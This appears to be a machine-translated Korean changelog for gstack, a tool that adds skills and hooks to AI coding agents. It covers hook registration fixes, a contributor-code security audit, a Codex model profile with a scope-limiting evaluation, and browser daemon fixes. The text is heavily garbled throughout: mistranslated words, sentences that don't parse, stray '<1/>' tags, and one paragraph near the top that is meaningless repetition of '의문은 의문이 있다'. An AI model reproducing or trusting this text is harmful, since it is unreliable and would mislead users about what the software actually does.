모든 세는 루트에 고정됩니다. Hook 등록은 이제 canonical-only: 명령은 안정된 `~/.claude/skills/gstack` 설치 또는 전혀 등록되지 않습니다. 소유권은 `bin/gstack-settings-hook`, Hook 항목 당 고정 정체성 테이블에 의해 결정되므로 태그를 파괴하고 스스로 쓴 후크를 주장 할 수 없습니다. 그리고 모든 `./setup`는 이제 치유를 먼저 실행합니다. `gstack-settings-hook prune-stale --repoint`는 죽은 gstack 항목, 재점 stale 하나, 복원된 태그, 그리고 붕괴 복제, 인쇄 한 줄을 때만 뭔가를 변경.

### 중요 한 숫자

출처: 실제 dev 박스에 2026-08-17 사건, `test/gstack-settings-hook-schema-aware.test.ts`의 `incident facsimile` 테스트로 바이트를 재생했습니다.

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| settings.json의 후크 항목 | 11 (6 죽은) | 5의 모든 canonical | −6 죽은 |
| AskUserQuestion 당 에러 라인 | 4 | 0 | −4 |
| Hook 프로세스는 아무것도 할 수있는 질문 당 spawned | 4 | 0 | −4 |
| 테스트 하에서 Traced code 경로 | — | 53 의 61 (87%) | 의 새로운 |

이때는, 의문은 의문이 아닌, 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문이 있다. 의문은 의문은 의문이 있다. 의문은문은 의문이 있다. 의문은문은문은문이 있다.

### 너를 위한 이 뜻

`./setup` (또는 `/gstack-upgrade`)를 한 번 실행하고, 오류는, 모든 기계에, 그 외에 무슨 뜻과 백업의 인쇄 영수증과 함께. 새로운 작업 공간은 결코 그들을 다시 삽입 할 수 없습니다. 당신이 이제 모든 것을 원하면, `gstack-uninstall`는 이제 실제로 이전 버전이나 판드를 포함하여 모든 gstack 걸이를 제거합니다.

### 항목화 된 변경

### 추가
- `gstack-settings-hook prune-stale [--repoint <root>] [--all]`: 걸이 등록을 위한 각자 치유. 죽은 gstack 입장은, stale 경로 안정되어 있는 설치에, 벗겨진 `_gstack_source` 꼬리표 ID 테이블에서 복원된, 정확한 중복 및 내열 쌍둥이 붕괴된 상태에서. 각 `./setup`의 시작에 자동적으로 달립니다; `--all`는 제거하고 `--no-team`에 의해 사용된 완전한 눈물 아래로 청소입니다.
- `gstack-config has <key>`: `get` (abent key를 위한 과태를 반환하는) 동일한 상태 디폴트 해결책을 통해서 열쇠 존재 체크, 그래서 logic는 과태에서 기록한 결정을 말할 수 있습니다.
- KNOWN_HOOKS 6개의 gstack 걸이 (계획 tune trio, 타임라인 스톱, 세션 업데이트, 검증 게이트)를 덮는 정체성 테이블은 등록 dedupe에 의해 공유하고 2는 결코 무서워 할 수 없습니다.
- settings.json 쓰기 주위의 뮤테이션 잠금: 소유자 token, 소유권 검사된 릴리스 및 원자 스텔 자물쇠로 로버와 함께 mkdir 기반. 백업은 고유 한 이름을 얻을 및 회전 (10 유지); `rollback` 그것의 포인터를 검증하고 원자로 복원.

### 변경
- Hook 등록은 canonical-only입니다. 설정은 글로벌 설정으로 실행되는 경로를 작성하지 않습니다. 안정적인 설치가 후크를 누락하면 대신 눈에 보이는 로그 라인과 건너 뛰기 때문입니다. AskUserQuestion 신뢰성 Hooks에 대한 도체 자동 선택은 명시적 결정 (flag, env, 또는 기록 된 구성 키)과 침묵하는 가을-through에서만 불을 존중합니다.
- `add-event`는 단일 인용 권위입니다: 등록된 명령은 일단 (whitespace와 포탄 metacharacters가 피한), 그래서 간격을 두거나 `$`-bearing 설치 경로는 첫번째 등록에서 작동 걸이를 일으킵니다. Windows는 모든 걸이에 필요한 `bash ` prefix를, 다만 SessionStart 및 MSYS-form 경로 no 더 긴 치유자에게 죽은으로 읽습니다.
- 모든 settings.json mutators는 per-item입니다: 훅은 gstack 훅과 동일한 항목에 위치, 제거를 포함하여 모든 gstack 가동을 살아남을, 그리고 gstack 당신의 품목을 포함 하는 항목에 대 한 항목에 대 한.
- Teardown 경로 (`gstack-uninstall`, `./setup --no-team`)는 어떤 deletion, 스윕 태그가 정체성에 의해 돌진을 실행하고, stderr를 붙인 지우기 때문에 건너뛰는 정리는 확고합니다, 결코 침묵하지 않습니다.

### 고정
- 삭제 된 지휘자 작업 공간 및 worktrees no 더 긴 각 AskUserQuestion, 세션 시작 및 중지 이벤트에 오류를 남기기.
- 손상 settings.json는 보존되고 보고됩니다 (예를들면 3) 다음 후크 작업으로 빈 객체로 대체됩니다.
- settings.json 파일 모드는 리쓰기 전 보존됩니다. 신선한 파일은 0600으로 만들어졌습니다.
- Liveness 체크는 죽은으로 만 이동할 수없는 부재를 치료하므로 양이나 권한 blip은 작업 후크를 prune 할 수 없습니다.
- 배너-트립 와이어 체크에서 vacuous 테스트는 JSON-as-shell-quoting을 통해 스크립트를 실행, 침묵적으로 `2nelsen` artifact를 기울여 각 스위트에서 실행하는 동안 repo 루트에서 아무것도; 그것은 이제 argv와 asserts 두 가지 지점을 전달한다.

### 기여자
- 60+ 새로운 또는 업데이트된 테스트 케이스 8 파일, 사건 facsimile, 두 작가 concurrency smoke, 루트 내부에서 설치 된 복사를 실행하는 제거 테스트 삭제, 열린 잠금 눈물 아래로 가시성, 둥근 지구 인용, 및 정적 삼각대 핀닝 대역 전용 등록, 치유-첫 번째 주문, 성-리터-리 패티, 그리고 공유-보통 전화 사이트.
- 이 릴리스의 검토 파이프라인 (전문가 플러스 레드 팀 플러스 두 개의 Codex 패스)에 기여 14 확인 된 경화 수정; 거부 된 발견은 PR에 문서화됩니다.

## [1.68.0.0] - 2026-08-18

**다음 트래커 웨이브 : 16에서 확인 된 수정, 90 stale PR 및 21 밖으로 문제.** **6 커뮤니티 기여자 신용, 좋은 1 개의 큐 레이스 사망.**

이 릴리스는 전체 다음 웨이브를 착륙 : 6 커뮤니티 PRs는 저자의 정수, 우리 자신의 10 가지 수정, 그리고 6 개의 adversarial-review는 마지막 파를 멸종시킵니다. 헤드 라인 내부 : 뇌 동기화 큐는 per-record spool 디렉토리로 이동하므로 enqueue/drain 경주 클래스는 구조적으로 사라지므로 좁은. 세션 업데이트 잠금 레코드는 실제로 작동 할 수 있습니다. <1/>는 더 이상 작동 할 수 있으므로, 더 이상 작동 할 수 있습니다. <1/> 그리고 이 파의 자체 검토 중 잡은 라이브 버그, stray `~/.git` 디렉토리가 침묵적으로 잘못 된 결정과 학습을 잘못된 프로젝트 저장소로, 자동 치유 캐시와 10 케이스 패리티 스위트로 고정됩니다.

### 중요 한 숫자

출처: 이 branch 대 주요 (`git diff main...HEAD --stat`), 파의 적용 감사, 그리고 추적기 가까운 실행 2026-08-17.

| Metric | 의 값 |
|---|---|
| 고정 착륙 (이 릴리스에 의해 닫힌 조직) | 16 |
| 커뮤니티 PR은 신용으로 향 | 6 (6 기여자) |
| 영수증을 닫은 PR | 90 |
| Stale 문제 버전 포인터로 닫히기 | 21 |
| Diff | 134 파일, +6,276 / −649 |
| New/extended 테스트 파일 | 31 (복지 감사 : 행동 + edge +error 깊이에서 변경 된 표면의 96 %) |
| 리뷰 라운드 흡수 된 전-merge | 3 (특별 군대, 그 두 개의 크로스 모델 adversarial 패스) |

The tracker numbers are the striking ones: 111 stale items left the queue in one day, each with a receipt naming the release that covered it. Contributors whose fixes were absorbed months ago now have closure with credit instead of an open PR going quiet.

### 너를 위한 이 뜻

뇌의 수치는 빈번하게 말한 경우, `--probe`는 `--bulk`가 거부된 수천 페이지 또는 Claude 세션을 중단한 gstack 업데이트 중 펄을 훔친 동안, 그 클래스가 닫히고 각 하나는 회귀 테스트에 의해 피된다. `/gstack-upgrade`로 업데이트하면, 이제 빠르게 진행하고 당신이 정확히 삭제하지 않고 작업을 방해하지 않는 것이 아니라, 먼저 삭제하지 않는 작업을 방해하지 않습니다.

### 항목화 된 변경

#### 추가
- `/scrape`와 `/skillify`는 이제 위탁된 내용 처리 규칙을 나타낸다.
  검색 참조와 함께 단일 소스 그래서 단어는 결코 무해 할 수 없습니다. PR #2612에서 다시 파생. @Lockyer228 (#2441)에 의해 기여.
- `$B cdp`는 `Emulation.setCPUThrottlingRate`를 허용하고
  `Network.emulateNetworkConditions` 가장 낮은 엔드 클라이언트에 실제 perf 측정. 명확하게 될 때까지 persist를 무시; justifications 이렇게 말한다. @henbima (#2602)에 의해 기여.
- Transcript ingest는 per-remote 신뢰 저장소를 명예를 줍니다: `deny`와 `read-only`
  리모트는 per-tier 조사로 건너 뛰고, 어떤 쓰기의 앞에 손상된 상점 낙관되고, 정책 보기는 전체적인 corpus (#2392)를 위한 1개의 배치한 잠수함입니다.
- gbrain 소스 worktree는 일상적인 동기화에 전진합니다. 그래서 뇌가 멈추지 않습니다.
  설정 사이에 stale 페이지를 제공. 무인한 경로는 더러운 worktrees를 거부하고 결코 강제 제거 (#2516).
- `gstack-gbrain-repo-policy get --batch`: 1개의 spawn는 각 리모트를 분류합니다.

#### 변경
- **Behavior 변화:** `gstack-config get <unknown-key>` 이제 1번 출구로 나와
  빈 출력, 그래서 `|| echo fallback` 콜러 마지막으로 화재. 빈 값이 의미있는 열쇠 (`cross_project_learnings`, `salience_allowlist`, `user_slug_at_*`, `redact_repo_visibility`, `repo_mode`)는 여전히 출구 0으로 빈다. 출구 0과 비난한 열쇠에 의존하는 스크립트는 가을을 추가해야합니다. @benjaminberes-bp (#2611)에 의해 기여.
- 뇌 동기화 큐는 maildir-style 스풀 (`.brain-queue.d/`, 하나의 파일입니다.
  기록, 원자 이름 당). 작가와 배수장치는 절대로 인로드를 공유하지 않습니다. 배수장치는 단지 기록 분류가 단계로 또는 떨어졌다는 것을 증명합니다, 그래서 급류 충돌 또는 변형된 풀드 개인지도는 그것을 불허하는 대신 모든 것을 유지합니다. 다음 하수구에 유산 큐는 migrate.
- `--probe` 메모리-INGest counts에서 동일한 특성과 정책
  `--bulk`로 게이트는, 경계 당 256KB 읽힌, 그래서 그것의 수입니다 수 있습니다. PR #2612에서 재 파생해. @Lockyer228 (#2394)에 의해 공헌하십시오.
- `/gstack-upgrade` autostash로 단식합니다; 파괴적인
  fallback은 no unpushed commits와 provably-clean tree에서만 실행되며, 명시된 확인 후는 discarded (#2517)를 정확히 나열합니다.
- Skill Complete는 항상 튼튼한 학습을 위한 세션을 검토하고 말한다
  그럼에도 불구하고 명시적으로. PR #2612에서 재 파생. @Lockyer228 (#2402)에 의해 기여.
- `/codex` 문서 측정된 세션 오버헤드 현실: 이력서는 하지 않습니다
  사전 구문을 구문하여 기술당 한 통화를 선호합니다 (#2387).
- MCP 범위 해결책은 프로젝트 일관적으로, 일치 Claude Code의 프로젝트 일관되게 입니다
  검증된 우선, 그리고 1개의 프로젝트의 먼 gbrain 등록 no는 기계에 다른 모든 프로젝트를 분류합니다.

#### 고정
- 계획 - tune는 쓰기 시간에 한 방법 질문 ids에 `never-ask`를 거부
  `--stats`의 이전에 저장된 비활성 환경 보고서. @szsunyuan (#2488)에 의해 기여.
- `gstack-redact` subcommand 출구 1번 출구로 갖춰서 침묵으로 사용
  stdin (또는 터미널에 거는) 검사. @kinoko-studio에 의해 공헌하는.
- 한 가지 주위 ref no 더 긴 전체적인 주석 스크린 샷을 죽이십시오 : 정확한
  일치는 정확히 유지, 주위 refs 첫 번째 매치로 돌아와 출력에서 보이지 않는. @namtrok에 의해 기여.
- `gstack-version-bump repair`는 `0.0.0.0`를 직물로 쓸 것을 거부합니다.
  package.json VERSION가 누락되거나 빈 경우, 진짜 `0.0.0.0` 파일이 아직도 수리됩니다. PR #2612에서 재 파생됩니다. @Lockyer228 (#2600)에 의해 공헌하십시오.
- 세션 업데이트 잠금은 라이브 홀더 (출구 된 부모가 아닙니다)를 기록합니다.
  긴 풀과 설정 중 심비는 단단한 TTL에 만료되므로 재순환 PID는 쐐기 할 수 없으며, 소유권 검사된 정리 (#2613)로 atomically를 다시 인용합니다.
- `gstack-slug`는 떼어낼 때도 canonical owner-repo slug를 해결합니다.
  마커 디렉토리는 repo 이상에 앉아; 독소 캐시 모양 자기 - 치유, 합법적 인 끈적한 식별은 보존되고, 네이티브 Windows 미들 백은 모든 핀 고정 된 고정 장치에 포탄 구현에 동의합니다.
- `/review` 체크리스트 경로는 설치된 기술 루트에서 해결하므로 검토
  모든 대상 repo에서 동작을 실행, gstack의 자체 체크 아웃 (#2518).
- next-version의 오프라인 fallback 쿼리 라이브 리모트 refs mutating 없이
  지방 국가, fetches는 포기하기 전에 청구를 읽을 수 있으며, 결코 침묵적으로 branch의 버전을 재발생하지 않습니다.
- Setup-registered Hooks는 글로벌 설치 경로와 repo인트 stale을 선호합니다.
  재 실행에 절대 경로; 중복 등록 하나에 붕괴; 손상 settings.json 대체 대신 크게 거부.
- Windows: 모든 `Bun.spawn`를 찾아서 `windowsHide`를 조사합니다.
  tripwire 및 프로젝트-경시 뇌는 backslash 경로에 해결합니다.

#### 기여자
- 90 흡수 또는 슈퍼스레드 PR 및 21 고정 문제 영수증에 닫혔다
  이 릴리스가 합병될 때, 이 릴리스가 합병될 때, 이 릴리스가 포함된 릴리스에서 의견 지적; 포트레이트 PRs가 포트링-컴밋 영수증과 닫힙니다.
- 파리티 스위트 골격 천장이 파도의 전반적 성장을 흡수
  측정된 노트; 설치 루트 형태로 참조된 경로 스캐너 자체 검사.
- TODOS.md: 구조상 고립, slug 상점을 보호하는 새로운 후속
  사전 설정 데이터의 마이그레이션, 이미 저장된 페이지에 대한 deny retroactivity, 그리고 슬러그 치유 프로브 캐시 sentinel.

## [1.67.2.0] - 2026-08-18

**Codex는 이제 모델을 실제로 실행합니다.** **gpt-5.6-sol 을 얻 경계-경 프로필 그 완료 작업, 그 다음 중지.**

gstack 기술은 모델별 행동 패치를 나타낸다. 이 릴리스는 Codex: `./setup --host codex`의 패치 모델 인식을 `model` `${CODEX_HOME:-~/.codex}/config.toml`에서 최상위 `model`를 읽고 일치 프로파일을 렌더링한다. 헤드 라인은 `gpt-5.6-sol`이다. 솔은 "exhaustive"와 "Boil the Ocean"과 같은 완전한 언어를 읽는다. 권한을 유지하고, 인접한 정리 및 speculative 경화를 넓히는 것은 새로운 핀 프로파일을 요청하지 않는다. 명시된 작업은 호수, 인접한 발견은 보고 전용, 조사는 일단 원인이 설치되면 중지, 한 깨끗한 검증 패스에 종료. 경계 내부 전체 적용은 여전히 적용, 그리고 AskUserQuestion 결정 브리프 형식은 결코 트리밍되지 않습니다.

해결은 정확히 매치 만. Terra, Luna, dated snapshots, 그리고 어떤 매핑 ID는 일반적인 GPT 프로필로 돌아와서, 그리고 일반적인 gpt에 `gpt-5.6-sol-2026-08-01` 땅과 같은 근해 때 해결사 전사.

### 중요 한 숫자

출처: 새로운 주기율 범위 종료 (`EVALS=1 EVALS_TIER=periodic bun test test/codex-e2e-sol-scope.test.ts`, `~/.gstack/projects/<slug>/evals/`) 및 무료 스위트 (`bun run test`).

| Metric | 의 전 | 후지후 |
|---|---|---|
| Codex 기술 오버레이 | 각 설치에 대한 한 고정 프로파일 | `config.toml`, `--model` per-run override와 일치 |
| 해결 한 줄 버그 (라이브 eval) | no 측정 | 21개 도구 통화로 고정, 173, 디코이 TODOs byte-identical |
| eval에서 범위 검사 | 측정되지 않음 | untracked, staged, 과 unstaged 파일 모든 계산 |
| 신비한 Codex E2E 환경 | 전체 연산자 `~/.codex` 나무에서 복사 | `auth.json`만, `CODEX_HOME` 핀으로 꼿습니다 |
| Kiro 기술 프로파일 | 공유 렌더링이 열거된 것을 상속 | 항상 claude 프로파일, 설치 시간에 재건 |
| 업그레이드 기술 reinstall 대상 | bare `./setup` (클래드) 각 호스트 | 호스트가 생성되었습니다. |

eval 행은 내부에 하나 이다: Claude를 말하는 동일한 조사 기술은 바다 드라이브를 끓는 솔을 정확하게 1개의 기능을 고치기 위하여 말하고, 1개의 표적 시험을 실행하고, 2개의 tempting decoy TODOs로 untouched 중지합니다.

### Codex 사용자를 위한 이 뜻은 무엇입니까

If you run Codex on `gpt-5.6-sol`, rerun `./setup --host codex` once. Your skills keep the full gstack workflow (STOP points, review gates, decision briefs) but stop sprawling into work you did not ask for. Change your Codex model later, rerun setup, and the profile follows. `--model <id>` overrides detection for one run and tells you how to make it stick.

### 항목화 된 변경

#### 추가
- `gpt-5.6-sol` 모델 프로필 (`model-overlays/gpt-5.6-sol.md`): 명시된 작업 경계, 보고 전용 인접 작업, 경계 조사, 확인 완료에 종료, AskUserQuestion 전체 보존 형식.
- Codex 설정에서 모델 검출: 새로운 `scripts/resolve-codex-generation-model.ts`는 `${CODEX_HOME:-~/.codex}/config.toml`에서 최상위 `model`를 읽고, 모델 allowlist에 대한 검증된 데이터로 구성 값을 치료합니다 (각면 문자열에서 스트립된 문자, 설정 위치에 절대 경로 가드), 그리고 읽지 않는 또는 지원되지 않은 구성에 경고를 가진 일반적인 GPT 단면도로 돌아갑니다. `./setup --host codex --model <id>`는 그 실행을 위해 override.
- Per-host 생성 기본값: `HostConfig.defaultModel`, 생성 시간에 검증. Codex no `--model`가 전달될 때 GPT 프로필을 렌더링한다; 다른 호스트는 claude를 유지합니다. `docs/ADDING_A_HOST.md` 새 필드를 문서화합니다.
- Periodic scope-termination E2E (`test/codex-e2e-sol-scope.test.ts`): installs the FULL generated investigate skill, plants a one-line bug beside decoy security and migration TODOs, and asserts the fix lands inside the boundary within 30 tool calls, the decoys stay byte-identical, the regression oracle survives unweakened, and nothing gets committed. Wired into the periodic eval matrix, the paid-shard globs, and diff-based selection (`codex-sol-scope-termination`).
- Sol-specific Completeness Principle and first-run intro copy: 사용자의 명시적 작업 경계 내에서 Ocean을 끓입니다.

#### 변경
- 자체 호스트를 다시 생성 된 업그레이드 기술 : `./setup --host codex` 렌더링 `--host kiro` (복사 시간에 따라 복사), `./setup`를 Kiro 복사합니다.
- Kiro installs는 기술을 복사하기 전에 claude 단면도를, 그 후에 해결한 Codex 단면도를, 이렇게 Kiro 결코 발송하지 않습니다 GPT 가족 행동 원본과 살아있는 `~/.codex` symlinks는 정확합니다. Codex 기술 경로는 `$CODEX_HOME`를 명예를 줍니다.
- 신비한 Codex E2E 주자 복사 `auth.json`만. 연산자 플러그인, MCP 서버, 규칙, 그리고 기술 no 더 긴 누출은 신비한 타원형으로. 퍼-런 `model`, TOML 구성 overrides, 그리고 `--ignore-user-config`는 지원됩니다.
- `setup`는 Codex 생성모델을 각 런 (read-only TOML 보기)에 해결해, 그래서 어떤 설치 경로는 Sol 사용자의 렌더링 프로파일을 보존합니다; 코덱은 요약을 활성화 프로필 및 소스 인쇄합니다.

#### 기여자
- 새로운 프리 계층 적용: 모든 해결자 branch hostile-config Shape (10 test), overlay content pins, 명시된 `--model`는 실제 세대를 통해 override CLI, codex E2E 파일 모두에 대한 실제 사용성 계층 분류 및 유효성 `defaultModel` 검증.
- `test/setup-codex-model.test.ts`에 있는 정체되는 핀은 짐 방위 조정 재산을 붙듭니다: unconditional 결심자, 인용된 `--explicit` argv, 실패 닫히는 빈 녹슬기 출구, Kiro claude-render 샌드위치 및 `--host kiro` 씁니다.
- Sol E2E는 `.agents`의 앞에 정확한 스냅샷을 만들고 `beforeAll`에서 그것을, 그래서 공유한 나무는 황금, 평행한 shards, 또는 symlinked 설치를 위해 솔 플레어를 체재하지 않습니다. 정착물은 어떤 세계적인 git 구성의 밑에 eval 달리는 가능하게 하는 gpg를 붙듭니다.

## [1.67.1.0] - 2026-08-16

**우리는 지난 2 개월 동안 외부 기부자 코드의 모든 라인을 읽었습니다.** **6개의 발견은, 2개의 refuted, 0개의 backdoors 강하게 했습니다.**

gstack는 6월 중순부터 합병한 모든 외부 공헌자 코드에 명시된 보안 청소를 ran: 7개의 직접 결합된 `time-attack` PRs, 2개의 포크 항구 돌진파 및 대략 fifty 흡수된 지역 사회 PRs. ~500의 파일에 관하여, adversarial 눈으로 읽으십시오. 정면을 베라멘트로 덮으십시오: no 백문, no 전 여과 경로, no 살아있는 누출은 안전 기여입니다. 순수한 안전은 안전 기여를 위한 것입니다. 이 릴리스는 6 개의 실제 발견을 밝히고, 회귀 테스트 뒤에 각 하나를 잠금, 그래서 재산은 건설에 의해 보유를 보호, 운이 없습니다.

이제 모든 캡 데이터베이스 암호를 잡아. 인식 된 브라우저 세션은 repo가 `.gitignore`가 아닌 git에서 유지됩니다. 앱 스토어 연결 키는 릴리스 흐름 mints는 scoped로 배송되고, 출구 보고서는 존재하고 어떻게 수정하는지 알려줍니다. iOS 테스트 브리지의 릴리스 컴파일 아웃 (v1.67.0.0에서 발송 됨)은 이제 모든 트랜잭션을 해제하는 것입니다. CI는 이제 모든 트랜잭션을 다시 실행하는 것입니다. CI는 이제 모든 트랜잭션을 다시 실행하는 데 실패한 것입니다. 브라우저 서버의 Node 스파드 시엠은 `exited`/drain/memory-cap 컨트랙트 백을 가지고 있습니다. Bearer-token 비교는 일정한 시간입니다.

### 중요 한 숫자

출처: 두 파 read-only 감사 (72 에이전트, 찾는 당 2개의 독립적인 수증기) 플러스 4 전문가 전 착륙 검토. `echo "postgres://admin:${DB_PW:-PROD2026SECRET}@h/db" | bin/gstack-redact`를 가진 헤드 라인 체크를 Reproduce (쉘은 진짜 모든 모자 암호에 땋아집니다; 출구 3)와 `bun run test`.

| Property | 의 전 | 후지후 |
|---|---|---|
| DSN는 사전푸시에서 모든 캡 암호 (`PROD2026SECRET`)를 가진 | HIGH 문 통과 | HIGH 블록 (exit 3) |
| `postgresql://USER:PASSWORD@host` 문서 위너 | skipped | 아직도 건너뛰기 (pinned) |
| `.gitignore`-less repo의 지속된 세션 쿠키 | git-committable의 특징 | 건설에 의해 무시 |
| Minted App Store는 키 범위를 연결합니다 | 팀의 모든 앱 | 배송되는 앱 |
| iOS 릴리스 컴파일 아웃 가드 (shipped v1.67.0.0) | unpinned | CI 모든 회귀에 삼각대 |
| `await proc.exited` Windows Node 떨어짐 | 해결 `undefined` | 실제 출구 코드를 해결 |
| Loopback Bearer-token 비교 | 바이트 바이트 `===` | 일정 시간 |

public repo: 옵트인 브라우저 세션 지속은 작동 나무 안쪽 `.gstack/` 아래 라이브 쿠키와 요청 로그를 유지. 이제 자체 유지 무시 토지 설정 시간에, 그래서 `git add -A && git push` 그들을 발송할 수 없습니다.

### 너를 위한 이 뜻

커뮤니티 또는 포크 포트 코드에서 끌어 놓은 빌드에서 gstack를 실행하면 누군가가 모든 것을 읽고 실제 식별 모양에 대한 가드를 측정하는 해제가 아니라, 그냥 위주자. 실행 `bin/gstack-egress verify` 및 `bin/gstack-redact` 자신 자신과 신뢰를 가진 자신의 repo장. 전체 감사 흔적과 지배 후속 (`main`에 대한 필수 리뷰 규칙)은 유지 보수자에 대해 캡처됩니다. 이 명령은 이미 실행되지 않습니다.

### 항목화 된 변경

#### 고정
- 사전 푸시 식별 스캐너는 HIGH tier에서 실제 모든 캡 비밀 (`PROD2026SECRET`-style)을 블록으로 DSN 라는 암호를 차단합니다. `USER:PASSWORD` 문서 규칙은 여전히, 전체 위주자 세트에 테이블 구동 테스트와 함께 양쪽 방향으로 핀으로 억압됩니다. (`lib/redact-patterns.ts`)
- 검색 상태 디렉토리 (`.gstack/`)는 디렉토리가 생성될 때, `session-state.json` 쿠키 및 `browse-network.log`/ `browse-audit.jsonl` 요청 헤더가 프로젝트 자체 `.gitignore`와 관계없이 절대로, 투입할 수 없습니다. (`browse/src/config.ts`)
- Node `Bun.spawn` 폴리필은 `exited` 약속, eager stdout/stderr 하수구 및 16MB 출력 캡을 재개하여 Windows Node fallback (cookie import, browser-skill children)에 대한 올바른 아이 처리 처리를 재개합니다. (`browse/src/bun-polyfill.cjs`)
- iOS QA 터치 브리지의 릴리스 컴파일 아웃 (`#if !defined(DEBUG)` 단축 회로 플러스 `cSettings` DEBUG 정의, v1.67.0.0에서 발송)는 자유 계층 정적 삼각에 의해 핀으로 꼿습니다: 플랫폼 전용 게이트, 재주문 가드에 대한 모든 회귀, 또는 떨어졌다는 것은 각 PR에 CI 실패를 정의합니다. (`test/ios-debug-bridge-release-guard.test.ts`)
- 검색 서버의 루프백 곰기 - 투큰 비교는 일정한 시간입니다. (`browse/src/server.ts`)

#### 변경
- App Store Connect 업로드 키는 Apple 릴리스 중 scoped 이며, 각 앱의 팀에 해당되는 `allAppsVisible:false` 으로 대상 앱에 `apps` 으로 접속하며, 릴리스 종료 보고서는 키와 그 재발행 경로가 공개됩니다. (`ship/sections/apple-release.md`)
- `gstack-egress verify` ledger truncation 및 deletion이 포렌식 방호성 위협 모델에 대한 범위가 나옵니다. (`bin/gstack-egress`)

#### 기여자
- 새로운 회귀는 침묵하는 역동에 대한 각 보안 특성을 핀을 보호합니다. 일정한 `validateAuth`, 수출 된 `URL_PASSWORD_PLACEHOLDER_WORDS`, 국가 디르 무시에 대한 무조건 쓰기 테스트, iOS 릴리스 컴파일 아웃을위한 정적 삼각대, 복원 된 `Bun.spawn` 계약 테스트.
## [1.67.0.0] - 2026-08-16

**트래커 파: 살아남은 macOS, 설치가 완료되고,** **메모리 동기화는 기록을 떨어뜨리지 않습니다. 30 기여자 착륙.**

이 릴리스는 전체 문제 추적기와 커뮤니티 PR 큐를 채굴합니다. 이제 macOS XProtect kill at Chromium 발사와 치유를 분류합니다. 그것은 quarantine 플래그를 명확하게하고, 오른쪽 설치 루트에서 핀 브라우저 개정을 다시 설치하고, retries, 모든 경계 및 로그를 기록합니다. 신선한 설치 링크 모든 실행 자산 기술 참조, 그래서 /review 및 친구는 청소 기계에 작업이 처음 뇌의 배치를 처리하는 것입니다. 개인 정보 취급 책임자는 유지되고 라벨을 붙이고 실패 push는 commit를 유지하고 다음 실행에 다시 배달하고, 재발은 그 자체를 저술합니다. 신용과 함께 착륙 한 20 년의 커뮤니티 PR과 합병에 가까운 약 30 분의 문제.

### 중요 한 숫자

파의 게이트 eval 실행에서 (`bun run eval:bg:gate`, `~/.gstack-dev/eval-runs/`)에 로그 및 HEAD에 무료 스위트 (`bun run test`).

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| macOS 26 (XProtect kill)에서 시작 | 수동 재설치 | 분류 + 자기 치유 | 자동 |
| 숙련된 런타임 자산을 신선한 설치 | SKILL.md + 섹션만 | 모든 참조 자산 | /review는 일 하나 일합니다 |
| push 실패에 뇌 동기화 큐 | truncated의 | 유지 + 재 배달 | no 데이터 손실 |
| push를 인터레이브 사용자 commit로 검출합니다. | 게시 됨 | 의제 | 저자 경계 |
| 문 evals | 41/43 | 43/43 | 두 reds 뿌리 caused |
| 무료 스위트 | — | ~7,000 시험, ~90-100s | HEAD에서 녹색 |

뇌동화 행은 내부화에 한개입니다: 큐는 단번의 반복적인 기록에 의해, 살아있는 재읽에 대하여, 그래서 기록은 다음 경계로 살아남을 수반된 중간 하수구 생존합니다.

### gstack 사용자를 위한 이 뜻은 무엇입니까

업그레이드 및 3 개의 가장 큰 장애 클래스가 사라졌습니다. 터미널을 터치하지 않고 macOS에서 다시 찾아, 팀메이트의 첫 `./setup`는 작업 능력을 생산하고, 크로스 머신 메모리는 flaky 네트워크에서 침묵적으로 얇게 멈춥니 다. ~35 문제 중 하나를 파일하면, 귀하의 재프로는 이제 커밋의 이름으로 회귀 테스트입니다.

### 항목화 된 변경

### 고정 — 세 P0s

- **macOS (#2554)에서 죽은 것을 찾아보십시오.** Playwright 1.62.1에 핀으로 꼿습니다 (에서 나누십시오
  dependabot #2582), plus an XProtect kill-signature classifier with positive AND negative fixtures, a one-shot quarantine-clear + bounded (~120s, process-group-killed) reinstall from the gstack install root that pins the matching Chromium revision, structured heal logging, and an upgrade-time quarantine-clear + reinstall in `setup` for already-poisoned caches. The heal resolves the install root via `os.homedir()` and keeps its manual-remediation guidance even when the post-heal retry fails.
- **신선한 설치 누락된 런타임 자산 (#2317, #2454).** `setup` 링크
  명시된 배당 리스트(node_modules, dist, *.tmpl, test, hidden)를 가진 모든 런타임 자산은 2 급 참조된 동종 시험에 의해 핀으로 꼿습니다: 별칭-relative 참고는 설치 별명, 소위된 dist/ Allowlist를 가진 repo-anchored 하나s의 밑에 있어야 합니다.
- **뇌 동기화 데이터 손실 (#2549).** Queue 레코드는 배수로 분류됩니다.
  시간: 횡단 필터링 및 비합성 드롭 WITH 카운트 (전체 경로 0600 sidecar), 개인 정보 보호-held 레코드는 "no 허용 변경으로 닦아 대신 유지되고 라벨링, 비파괴 라인 보존되고, LIVE에서 무대 세트를 다시 덮어 그래서 동시 수복을 살아. 실패 push 유지; 그것의 유지; 런 스타트 검출기는 재 납품을 다시 - 영수증을 뽑아, 고정, 10 분 당 하나의 시도에 throttled, git의 저속 한계 (주 macOS)에 의해 경계, 그리고 불을 불을 때 EVERY unpushed commit는 그것의 자신의, 그래서 ~/.gstack에서 interleaved 수동 commit는 결코 자동 선적되지 않습니다. sync 자물쇠는 각 중간 출구에, 중단합니다.

#### 고정 - 검색 및 daemon 수명주기

- 건강한 daemon는 `browse start` (#2219 철 규칙)에 의해 결코 죽지 않습니다:
  ~8s의 총 판결 건강 probe 답변, 바쁜 데몬스는 "레트리 또는 --force-restart"를 비제로 출구와 함께하고, 심지어는 `--force-restart`는 재발견 테스트에 의해 핀으로 움직여 살아있었습니다. `browse stop`는 성공 #2254에 `/gstack-upgrade`의 단락을 결정하고 daemon를 프린트하고 (#2551)를 프린트합니다.
- Chromium no 더 긴 맨끝으로 죽습니다: 신호 취급은 떨어져 움직입니다
  Playwright의 기본값은 SIGHUP 핸들러가 실제 폐쇄 경로로 여정을 통해, 그리고 삼각대는 카운트를 핀으로 묶는 모든 3개의 발사 위치에 있습니다.
- daemon와 같은 고정 포트 범위에서 단말 에이전트 할당
